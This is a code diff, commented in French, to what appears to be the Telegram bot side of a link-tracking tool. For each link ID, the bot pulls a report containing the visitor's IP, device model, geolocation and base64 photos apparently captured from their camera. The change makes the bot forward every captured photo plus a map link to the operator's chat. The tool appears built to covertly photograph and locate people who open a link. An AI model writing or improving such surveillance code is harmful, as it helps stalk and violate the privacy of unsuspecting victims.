@@ -229,6 +229,7 @@ async function sendDataById(chatId, linkId) {
         });
         const data = response.data;
 
+        // 1. Envoyer le résumé texte d'abord
         let message = `📊 *RAPPORT* - \`${linkId}\`\n\n`;
         message += `⏰ ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
         message += `🌐 IP: ${data.ip || "Masquée"}\n`;
@@ -241,22 +242,39 @@ async function sendDataById(chatId, linkId) {
             message += `📱 ${data.device.vendor || ""} ${data.device.model || "Mobile"}\n`;
         }
 
-        message += `📸 Photos : ${data.images ? data.images.length : 0}`;
+        const photoCount = data.images ? data.images.length : 0;
+        message += `📸 Photos capturées : ${photoCount}`;
 
         await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
 
-        if (data.images && data.images.length > 0) {
-            const imgBuffer = Buffer.from(data.images[0], "base64");
-            await bot.sendPhoto(chatId, imgBuffer, { caption: "📸 Photo 1" });
+        // 2. ENVOYER TOUTES LES PHOTOS (BOUCLE)
+        if (photoCount > 0) {
+            await bot.sendMessage(chatId, `🚀 **Envoi de la galerie (${photoCount} photos)...**`);
+            
+            // On boucle sur chaque image trouvée
+            for (let i = 0; i < photoCount; i++) {
+                try {
+                    const imgBuffer = Buffer.from(data.images[i], "base64");
+                    await bot.sendPhoto(chatId, imgBuffer, { 
+                        caption: `📸 Photo ${i + 1} sur ${photoCount}` 
+                    });
+                } catch (err) {
+                    console.error(`Erreur photo ${i}:`, err.message);
+                }
+            }
+        } else {
+            bot.sendMessage(chatId, "❌ Aucune photo capturée pour ce lien.");
         }
 
+        // 3. Envoyer la carte si localisation dispo
         if (data.location && data.location.latitude) {
             const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
             bot.sendMessage(chatId, `🗺️ [Voir sur la carte](${mapsUrl})`, { parse_mode: "Markdown", disable_web_page_preview: false });
         }
 
     } catch (error) {
-        bot.sendMessage(chatId, `❌ Pas de données pour \`${linkId}\``, { parse_mode: "Markdown" });
+        console.error(error);
+        bot.sendMessage(chatId, `❌ **Erreur :** Impossible de récupérer les données pour \`${linkId}\`.\nVérifie que l'ID est correct.`, { parse_mode: "Markdown" });
     }
 }
 
